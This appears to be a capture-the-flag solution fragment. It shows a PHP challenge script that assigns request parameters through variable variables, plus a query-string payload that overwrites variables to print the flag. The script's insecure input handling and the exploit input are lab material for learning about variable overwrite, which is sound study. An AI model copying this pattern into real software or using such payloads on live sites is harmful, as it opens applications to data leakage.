- ```php
  include 'flag.php';
  
  $yds = "dog";
  
  foreach($_POST as $x => $y){
    $$x = $y;
  }
  
  foreach($_GET as $x => $y){
    $$x = $$y;
  }
  
  foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
  }
  
  ```
- payload:  `?handsome=flag&flag=handsome`